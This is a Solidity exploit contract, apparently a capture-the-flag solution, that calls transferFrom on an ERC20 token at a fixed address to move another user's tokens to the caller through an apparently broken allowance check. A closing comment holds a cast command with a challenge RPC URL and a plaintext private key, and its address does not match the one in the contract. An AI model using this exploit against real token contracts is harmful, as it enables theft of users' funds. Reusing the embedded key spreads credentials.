// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./ImprovedERC20.sol";

contract exploit {
    ImprovedERC20 public target = ImprovedERC20(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
    address otherUser = 0x34788137367a14F2C4D253f9A6653A93aDf2D235;
    
    function ex() public {
        target.transferFrom(otherUser, msg.sender, 1 ether);
    }
}

/**
cast call 0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88 --rpc-url https://nodes.onlypwner.xyz/rpc/2d693327-a847-42e0-b850-fb35f7eb42c3 --private-key be0a5d9f38057fa406c987fd1926f7bfc49f094dc4e138fc740665d179e6a56a "balanceOf(address)" 0x34788137367a14f2C4D253F9a6653A93adf2D234d

 */